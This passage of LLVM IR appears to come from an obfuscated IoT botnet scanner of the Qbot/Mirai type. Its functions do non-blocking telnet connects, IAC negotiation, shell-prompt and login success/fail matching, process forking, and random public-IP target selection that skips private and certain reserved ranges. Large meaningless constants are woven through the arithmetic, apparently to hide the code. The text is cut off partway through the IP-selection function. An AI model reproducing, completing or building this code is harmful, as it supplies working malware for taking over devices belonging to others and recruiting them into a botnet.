  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = and i64 %22, 2048
  %24 = xor i64 %22, 2048
  %25 = or i64 %23, %24
  %26 = or i64 %22, 2048
  store i64 %25, i64* %15, align 8
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %15, align 8
  %29 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i64 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %8, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #13
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %113

; <label>:40:                                     ; preds = %4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %42 = getelementptr inbounds [8 x i8], [8 x i8]* %41, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 8, i32 4, i1 false)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %101

; <label>:48:                                     ; preds = %40
  %49 = call i32* @__errno_location() #13
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %52, label %99

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  br label %66

; <label>:66:                                     ; preds = %57
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = and i64 %76, %70
  %78 = xor i64 %76, %70
  %79 = or i64 %77, %78
  %80 = or i64 %76, %70
  store i64 %79, i64* %75, align 8
  %81 = load i32, i32* %6, align 4
  %82 = sub i32 0, %81
  %83 = sub i32 0, 1
  %84 = add i32 %82, %83
  %85 = sub i32 0, %84
  %86 = add nsw i32 %81, 1
  %87 = call i32 @select(i32 %85, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %88 = icmp sgt i32 %87, 0
  br i1 %88, label %89, label %97

; <label>:89:                                     ; preds = %66
  store i32 4, i32* %13, align 4
  %90 = load i32, i32* %6, align 4
  %91 = bitcast i32* %14 to i8*
  %92 = call i32 @getsockopt(i32 %90, i32 1, i32 4, i8* %91, i32* %13) #2
  %93 = load i32, i32* %14, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %89
  store i32 0, i32* %5, align 4
  br label %113

; <label>:96:                                     ; preds = %89
  br label %98

; <label>:97:                                     ; preds = %66
  store i32 0, i32* %5, align 4
  br label %113

; <label>:98:                                     ; preds = %96
  br label %100

; <label>:99:                                     ; preds = %48
  store i32 0, i32* %5, align 4
  br label %113

; <label>:100:                                    ; preds = %98
  br label %101

; <label>:101:                                    ; preds = %100, %40
  %102 = load i32, i32* %6, align 4
  %103 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 3, i8* null)
  %104 = sext i32 %103 to i64
  store i64 %104, i64* %15, align 8
  %105 = load i64, i64* %15, align 8
  %106 = xor i64 -2049, -1
  %107 = xor i64 %105, %106
  %108 = and i64 %107, %105
  %109 = and i64 %105, -2049
  store i64 %108, i64* %15, align 8
  %110 = load i32, i32* %6, align 4
  %111 = load i64, i64* %15, align 8
  %112 = call i32 (i32, i32, ...) @fcntl(i32 %110, i32 4, i64 %111)
  store i32 1, i32* %5, align 4
  br label %113

; <label>:113:                                    ; preds = %101, %99, %97, %95, %39
  %114 = load i32, i32* %5, align 4
  ret i32 %114
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %61

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 8219621096500117047
  %13 = add i64 %12, 1
  %14 = sub i64 %13, 8219621096500117047
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = add i64 %16, -4519565427386534363
  %18 = add i64 %17, 1
  %19 = sub i64 %18, -4519565427386534363
  %20 = add i64 %16, 1
  %21 = mul i64 %19, 4
  %22 = call noalias i8* @malloc(i64 %21) #2
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %24

; <label>:24:                                     ; preds = %43, %10
  %25 = load i32, i32* %4, align 4
  %26 = zext i32 %25 to i64
  %27 = load i64, i64* @numpids, align 8
  %28 = sub i64 %27, -1351974637628952587
  %29 = sub i64 %28, 1
  %30 = add i64 %29, -1351974637628952587
  %31 = sub i64 %27, 1
  %32 = icmp ult i64 %26, %30
  br i1 %32, label %33, label %48

; <label>:33:                                     ; preds = %24
  %34 = load i32*, i32** @pids, align 8
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = getelementptr inbounds i32, i32* %34, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = zext i32 %40 to i64
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  br label %43

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %4, align 4
  %45 = sub i32 0, 1
  %46 = sub i32 %44, %45
  %47 = add i32 %44, 1
  store i32 %46, i32* %4, align 4
  br label %24

; <label>:48:                                     ; preds = %24
  %49 = load i32, i32* %2, align 4
  %50 = load i32*, i32** %3, align 8
  %51 = load i64, i64* @numpids, align 8
  %52 = sub i64 %51, 4274586330551815696
  %53 = sub i64 %52, 1
  %54 = add i64 %53, 4274586330551815696
  %55 = sub i64 %51, 1
  %56 = getelementptr inbounds i32, i32* %50, i64 %54
  store i32 %49, i32* %56, align 4
  %57 = load i32*, i32** @pids, align 8
  %58 = bitcast i32* %57 to i8*
  call void @free(i8* %58) #2
  %59 = load i32*, i32** %3, align 8
  store i32* %59, i32** @pids, align 8
  %60 = load i32, i32* %2, align 4
  store i32 %60, i32* %1, align 4
  br label %61

; <label>:61:                                     ; preds = %48, %8
  %62 = load i32, i32* %1, align 4
  ret i32 %62
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.345, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %115, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %122

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %86, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %84

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = add i64 0, 3336133058326089663
  %30 = sub i64 %29, %28
  %31 = sub i64 %30, 3336133058326089663
  %32 = sub i64 0, %28
  %33 = getelementptr inbounds i8, i8* %26, i64 %31
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %82, label %37

; <label>:37:                                     ; preds = %22
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, 4706922143807192860
  %45 = sub i64 %44, %43
  %46 = add i64 %45, 4706922143807192860
  %47 = sub i64 0, %43
  %48 = getelementptr inbounds i8, i8* %41, i64 %46
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %82, label %52

; <label>:52:                                     ; preds = %37
  %53 = load i8*, i8** %3, align 8
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = sub i64 0, -1473315341719191497
  %60 = sub i64 %59, %58
  %61 = add i64 %60, -1473315341719191497
  %62 = sub i64 0, %58
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp eq i32 %65, 13
  br i1 %66, label %82, label %67

; <label>:67:                                     ; preds = %52
  %68 = load i8*, i8** %3, align 8
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load i32, i32* %7, align 4
  %73 = sext i32 %72 to i64
  %74 = add i64 0, 1908418155153872139
  %75 = sub i64 %74, %73
  %76 = sub i64 %75, 1908418155153872139
  %77 = sub i64 0, %73
  %78 = getelementptr inbounds i8, i8* %71, i64 %76
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 10
  br label %82

; <label>:82:                                     ; preds = %67, %52, %37, %22
  %83 = phi i1 [ true, %52 ], [ true, %37 ], [ true, %22 ], [ %81, %67 ]
  br label %84

; <label>:84:                                     ; preds = %82, %18
  %85 = phi i1 [ false, %18 ], [ %83, %82 ]
  br i1 %85, label %86, label %92

; <label>:86:                                     ; preds = %84
  %87 = load i32, i32* %7, align 4
  %88 = sub i32 %87, 846195423
  %89 = add i32 %88, 1
  %90 = add i32 %89, 846195423
  %91 = add nsw i32 %87, 1
  store i32 %90, i32* %7, align 4
  br label %18

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %3, align 8
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = load i32, i32* %7, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 0, -1989674555998524057
  %100 = sub i64 %99, %98
  %101 = add i64 %100, -1989674555998524057
  %102 = sub i64 0, %98
  %103 = getelementptr inbounds i8, i8* %96, i64 %101
  %104 = load i8, i8* %103, align 1
  %105 = sext i8 %104 to i32
  %106 = load i8*, i8** %4, align 8
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = load i8, i8* %109, align 1
  %111 = sext i8 %110 to i32
  %112 = icmp eq i32 %105, %111
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %92
  store i32 1, i32* %2, align 4
  br label %123

; <label>:114:                                    ; preds = %92
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = load i32, i32* %6, align 4
  %117 = sub i32 0, %116
  %118 = sub i32 0, 1
  %119 = add i32 %117, %118
  %120 = sub i32 0, %119
  %121 = add nsw i32 %116, 1
  store i32 %120, i32* %6, align 4
  br label %11

; <label>:122:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %123

; <label>:123:                                    ; preds = %122, %113
  %124 = load i32, i32* %2, align 4
  ret i32 %124
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %151, %8
  %34 = load i32, i32* %18, align 4
  %35 = sub i32 %34, -1679397295
  %36 = add i32 %35, 2
  %37 = add i32 %36, -1679397295
  %38 = add nsw i32 %34, 2
  %39 = load i32, i32* %16, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %33
  %42 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %43 = load i64, i64* %42, align 8
  %44 = icmp sgt i64 %43, 0
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %47 = load i64, i64* %46, align 8
  %48 = icmp sgt i64 %47, 0
  br label %49

; <label>:49:                                     ; preds = %45, %41
  %50 = phi i1 [ true, %41 ], [ %48, %45 ]
  br label %51

; <label>:51:                                     ; preds = %49, %33
  %52 = phi i1 [ false, %33 ], [ %50, %49 ]
  br i1 %52, label %53, label %152

; <label>:53:                                     ; preds = %51
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !5
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %24, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %25, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %10, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %69 = load i32, i32* %10, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = and i64 %73, %67
  %75 = xor i64 %73, %67
  %76 = or i64 %74, %75
  %77 = or i64 %73, %67
  store i64 %76, i64* %72, align 8
  %78 = load i32, i32* %10, align 4
  %79 = add i32 %78, -791461663
  %80 = add i32 %79, 1
  %81 = sub i32 %80, -791461663
  %82 = add nsw i32 %78, 1
  %83 = call i32 @select(i32 %81, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %84 = icmp slt i32 %83, 1
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %63
  br label %152

; <label>:86:                                     ; preds = %63
  %87 = load i8*, i8** %15, align 8
  %88 = load i32, i32* %18, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  store i8* %90, i8** %23, align 8
  %91 = load i32, i32* %10, align 4
  %92 = load i8*, i8** %23, align 8
  %93 = call i64 @recv(i32 %91, i8* %92, i64 1, i32 0)
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %19, align 4
  %95 = load i32, i32* %19, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %100, label %97

; <label>:97:                                     ; preds = %86
  %98 = load i32, i32* %19, align 4
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %97, %86
  store i32 0, i32* %9, align 4
  br label %157

; <label>:101:                                    ; preds = %97
  %102 = load i32, i32* %19, align 4
  %103 = load i32, i32* %18, align 4
  %104 = add i32 %103, -2018707553
  %105 = add i32 %104, %102
  %106 = sub i32 %105, -2018707553
  %107 = add nsw i32 %103, %102
  store i32 %106, i32* %18, align 4
  %108 = load i8*, i8** %23, align 8
  %109 = load i8, i8* %108, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 255
  br i1 %111, label %112, label %137

; <label>:112:                                    ; preds = %101
  %113 = load i32, i32* %10, align 4
  %114 = load i8*, i8** %23, align 8
  %115 = getelementptr inbounds i8, i8* %114, i64 1
  %116 = call i64 @recv(i32 %113, i8* %115, i64 2, i32 0)
  %117 = trunc i64 %116 to i32
  store i32 %117, i32* %19, align 4
  %118 = load i32, i32* %19, align 4
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %123, label %120

; <label>:120:                                    ; preds = %112
  %121 = load i32, i32* %19, align 4
  %122 = icmp eq i32 %121, 0
  br i1 %122, label %123, label %124

; <label>:123:                                    ; preds = %120, %112
  store i32 0, i32* %9, align 4
  br label %157

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %19, align 4
  %126 = load i32, i32* %18, align 4
  %127 = sub i32 %126, 872685350
  %128 = add i32 %127, %125
  %129 = add i32 %128, 872685350
  %130 = add nsw i32 %126, %125
  store i32 %129, i32* %18, align 4
  %131 = load i32, i32* %10, align 4
  %132 = load i8*, i8** %23, align 8
  %133 = call i32 @negotiate(i32 %131, i8* %132, i32 3)
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %136, label %135

; <label>:135:                                    ; preds = %124
  store i32 0, i32* %9, align 4
  br label %157

; <label>:136:                                    ; preds = %124
  br label %151

; <label>:137:                                    ; preds = %101
  %138 = load i8*, i8** %15, align 8
  %139 = load i8*, i8** %11, align 8
  %140 = call i8* @strstr(i8* %138, i8* %139) #10
  %141 = icmp ne i8* %140, null
  br i1 %141, label %149, label %142

; <label>:142:                                    ; preds = %137
  %143 = load i32, i32* %12, align 4
  %144 = icmp ne i32 %143, 0
  br i1 %144, label %145, label %150

; <label>:145:                                    ; preds = %142
  %146 = load i8*, i8** %15, align 8
  %147 = call i32 @matchPrompt(i8* %146)
  %148 = icmp ne i32 %147, 0
  br i1 %148, label %149, label %150

; <label>:149:                                    ; preds = %145, %137
  store i32 1, i32* %20, align 4
  br label %152

; <label>:150:                                    ; preds = %145, %142
  br label %151

; <label>:151:                                    ; preds = %150, %136
  br label %33

; <label>:152:                                    ; preds = %149, %85, %51
  %153 = load i32, i32* %20, align 4
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %155, label %156

; <label>:155:                                    ; preds = %152
  store i32 1, i32* %9, align 4
  br label %157

; <label>:156:                                    ; preds = %152
  store i32 0, i32* %9, align 4
  br label %157

; <label>:157:                                    ; preds = %156, %155, %135, %123, %100
  %158 = load i32, i32* %9, align 4
  ret i32 %158
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #2
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #2
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #2
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %154, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %152, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %152, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %152, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %152, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 16
  br i1 %33, label %152, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  br i1 %37, label %152, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  br i1 %41, label %152, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 192
  br i1 %45, label %46, label %50

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 168
  br i1 %49, label %152, label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 172
  br i1 %53, label %54, label %62

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sge i32 %56, 16
  br i1 %57, label %58, label %62

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %60, 32
  br i1 %61, label %152, label %62

; <label>:62:                                     ; preds = %58, %54, %50
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 100
  br i1 %65, label %66, label %74

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sge i32 %68, 64
  br i1 %69, label %70, label %74

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %72, 127
  br i1 %73, label %152, label %74

; <label>:74:                                     ; preds = %70, %66, %62
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 169
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
